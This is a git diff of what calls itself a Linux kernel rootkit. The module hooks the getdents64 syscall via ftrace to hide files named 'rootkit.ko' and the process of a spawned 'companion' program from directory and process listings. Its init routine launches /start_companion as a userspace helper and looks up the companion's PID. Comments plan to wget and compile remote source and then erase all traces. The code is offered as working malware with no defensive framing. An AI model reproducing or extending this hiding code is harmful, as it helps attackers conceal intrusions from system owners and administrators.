@@ -11,8 +11,10 @@
 #include <linux/dirent.h>
 #include <linux/fs.h>
 #include <linux/string.h>
+#include <linux/ctype.h>
 #include <linux/file.h>
 #include <linux/stat.h>
+#include <linux/sched/signal.h>
 
 // https://www.intel.com/content/www/us/en/docs/dpcpp-cpp-compiler/developer-guide-reference/2024-1/foptimize-sibling-calls.html
 #pragma GCC optimize("-fno-optimize-sibling-calls")
@@ -25,6 +27,8 @@ struct ftrace_hook {
     unsigned long address;
     struct ftrace_ops ops;
 };
+
+int pid_companion = -1;
 
 static int find_sys_call_addr(struct ftrace_hook *hook) {
     hook->address = kallsyms_lookup_name(hook->name);
@@ -97,126 +101,35 @@ static void fh_remove_hook(struct ftrace_hook *hook)
 
 static asmlinkage long (*original_call)(const struct pt_regs *);
 
-// Original getdents64 syscall :
-/*
-  struct getdents_callback64 {
-	  struct dir_context ctx;
-  	struct linux_dirent64 __user * current_dir;
-	  int prev_reclen;
-	  int count;
-	  int error;
-  };
 
-static int verify_dirent_name(const char *name, int len)
-{
-	if (len <= 0 || len >= PATH_MAX)
-		return -EIO;
-	if (memchr(name, '/', len))
-		return -EIO;
-	return 0;
-}
-
-#define unsafe_copy_dirent_name(_dst, _src, _len, label) do {	\
-	char __user *dst = (_dst);				\
-	const char *src = (_src);				\
-	size_t len = (_len);					\
-	unsafe_put_user(0, dst+len, label);			\
-	unsafe_copy_to_user(dst, src, len, label);		\
-} while (0)
-
-static bool filldir64(struct dir_context *ctx, const char *name, int namlen,
-		     loff_t offset, u64 ino, unsigned int d_type)
-{
-	struct linux_dirent64 __user *dirent, *prev;
-	struct getdents_callback64 *buf =
-		container_of(ctx, struct getdents_callback64, ctx);
-	int reclen = ALIGN(offsetof(struct linux_dirent64, d_name) + namlen + 1,
-		sizeof(u64));
-	int prev_reclen;
-
-	buf->error = verify_dirent_name(name, namlen);
-	if (unlikely(buf->error))
-		return false;
-	buf->error = -EINVAL;	 only used if we fail.. 
-	if (reclen > buf->count)
-		return false;
-	prev_reclen = buf->prev_reclen;
-	if (prev_reclen && signal_pending(current))
-		return false;
-	dirent = buf->current_dir;
-	prev = (void __user *)dirent - prev_reclen;
-	if (!user_write_access_begin(prev, reclen + prev_reclen))
-		goto efault;
-
-	 This might be 'dirent->d_off', but if so it will get overwritten 
-	unsafe_put_user(offset, &prev->d_off, efault_end);
-	unsafe_put_user(ino, &dirent->d_ino, efault_end);
-	unsafe_put_user(reclen, &dirent->d_reclen, efault_end);
-	unsafe_put_user(d_type, &dirent->d_type, efault_end);
-	unsafe_copy_dirent_name(dirent->d_name, name, namlen, efault_end);
-	user_write_access_end();
-
-	buf->prev_reclen = reclen;
-	buf->current_dir = (void __user *)dirent + reclen;
-	buf->count -= reclen;
-	return true;
-
-efault_end:
-	user_write_access_end();
-efault:
-	buf->error = -EFAULT;
-	return false;
-}
-
-getdent64 {
-	  struct fd f;
-	  struct getdents_callback64 buf = {
-	  	.ctx.actor = filldir64,
-	  	.count = count,
-	  	.current_dir = dirent
-	  };
-
-	  int error;
-
-	  f = fdget_pos(fd);
-	  if (!f.file)
-	  	return -EBADF;
-
-	  error = iterate_dir(f.file, &buf.ctx);
-	  if (error >= 0)
-	  	error = buf.error;
-	  if (buf.prev_reclen) {
-	  	struct linux_dirent64 __user * lastdirent;
-	  	typeof(lastdirent->d_off) d_off = buf.ctx.pos;
-
-	  	lastdirent = (void __user *) buf.current_dir - buf.prev_reclen;
-	  	if (put_user(d_off, &lastdirent->d_off))
-	  		error = -EFAULT;
-	  	else
-	  		error = count - buf.count;
-	  }
-	  fdput_pos(f);
-	  return error;
-}
-
-
-
-*/
 /*
  * di -> FD
  * si -> struct dirent
  * dx -> count, taille de buffer %di
 */
+
+static inline int is_digit(int c) {
+    return (c >= '0' && c <= '9');
+}
+
+
+static bool is_numeric(char *str) {
+  int i = 0;
+  while (str[i] && is_digit(str[i])) {
+    i++;
+  }
+  return (i == strlen(str));
+}
+
 static asmlinkage long myGetDents(const struct pt_regs *regs) {
 
     printk(KERN_INFO "Hello there\n");
     int dirent_idx = 0;
+    int buff_pid = -1;
     struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
     struct linux_dirent64* dirent_buff;
 //   long int          count = regs->dx;
 //    long unsigned int fd = regs->di;
-
-    struct linux_dirent64* dirent_buff_prev = NULL;
 
     int getdent_ret = original_call(regs);
 
@@ -225,20 +138,35 @@ static asmlinkage long myGetDents(const struct pt_regs *regs) {
     }
     void *dbuf = (void *)(dirent);
   //array of "string to hide"
+    char *string_to_hide[] = {"rootkit.ko", NULL};
     int to_hide = 0;
 
-    while (dirent_idx + to_hide < getdent_ret) {
+    while (dirent_idx + to_hide< getdent_ret) {
       dirent_buff = (struct linux_dirent64 *)(dbuf + dirent_idx);
-      printk(KERN_INFO "|%i| %i \n", getdent_ret, dirent_buff->d_reclen);
-      if (strstr(dirent_buff->d_name, "rootkit.ko") != NULL) {
-          to_hide += dirent_buff->d_reclen;
-          //Copy 
-          memcpy(dbuf + dirent_idx, dbuf + dirent_idx + dirent_buff->d_reclen, getdent_ret - (dirent_idx + dirent_buff->d_reclen));
-           // continue;
+      int i = 0;
+      if (is_numeric(dirent_buff->d_name)) {
+        buff_pid = (int)simple_strtol(dirent_buff->d_name, NULL, 10);
+        if (buff_pid == pid_companion) {
+            to_hide += dirent_buff->d_reclen;
+            // So if we match, we just copy the next dirent_struct list until the end to the current one, so, it remove the chain link
+            memcpy(dbuf + dirent_idx, dbuf + dirent_idx + dirent_buff->d_reclen, getdent_ret - (dirent_idx + dirent_buff->d_reclen));
+        }
       } else {
-        dirent_buff_prev = dirent_buff;
-        dirent_idx += dirent_buff->d_reclen;
+        while (string_to_hide[i] != NULL) {
+          if (strstr(dirent_buff->d_name, string_to_hide[i]) != NULL) {
+            to_hide += dirent_buff->d_reclen;
+            // So if we match, we just copy the next dirent_struct list until the end to the current one, so, it remove the chain link
+            memcpy(dbuf + dirent_idx, dbuf + dirent_idx + dirent_buff->d_reclen, getdent_ret - (dirent_idx + dirent_buff->d_reclen));
+            break ;
+          }
+          i++;
+        }
       }
+    if (string_to_hide[i] == NULL || buff_pid != pid_companion) {
+      // We increment only when it's not a match
+      dirent_idx += dirent_buff->d_reclen;
+    }
+  }
 
     /*
    printf("%-10s ", (d_type == DT_REG) ?  "regular" :
@@ -249,28 +177,60 @@ static asmlinkage long myGetDents(const struct pt_regs *regs) {
    (d_type == DT_BLK) ?  "block dev" :
    (d_type == DT_CHR) ?  "char dev" : "???");
     */
-  }
-	return dirent_idx - to_hide;
+	  return dirent_idx;
 }
 
 
 
-static  struct ftrace_hook f_hook = {
+static  struct ftrace_hook *f_hook[] = {&(struct ftrace_hook){
     .name = "__x64_sys_getdents64",
     .function = (myGetDents),
     .original = (&original_call),
-};
+}, NULL};
 
 static int __init rootkit_init(void) {
-    if (fh_install_hook(&f_hook)) {
+    printk(KERN_INFO "%i\n", current->pid);
+    char *argv[] = {"/start_companion", NULL};
+    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+
+  // Protocol:
+
+  // Probably have to run a gcc .c
+  // We could host the .c on a github or any server
+  // So we would like download the .c, with a wget
+  // Then compile it gcc
+  // Then launch the companion
+  // Then remove all trace
+
+  // So it has to be obfuscate from ps : How do we get the PID ?
+  // It's possible to get the pid of a kernelModule with current->pid
+
+    int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    if (r) {
+      printk(KERN_INFO "Rootkit has been loaded\n");
+    }
+    struct task_struct *task;
+    pid_t pid_buff = -1;
+   printk(KERN_INFO "PLEASE");
+    for_each_process(task) {
+      if (!strcmp(task->comm, "companion")) {
+        pid_companion = task->pid;
+        printk(KERN_INFO "PLEASE2");
+        break ;
+      }
+      pid_buff = task->pid;
+    }
+    printk(KERN_INFO "PID %d", pid_companion);
+    printk(KERN_INFO "pid %d", pid_companion);
+    if (fh_install_hook(f_hook[0])) {
       printk(KERN_INFO "Bruh minstall hook eroor\n");
-   }
-    printk(KERN_INFO "Rootkit has been loaded\n");
+    }
+
     return 0;
 }
 
 static void __exit rootkit_exit(void) {
-    fh_remove_hook(&f_hook);
+    fh_remove_hook(f_hook[0]);
     printk(KERN_INFO "Rootkit has been unloaded\n");
 }
 
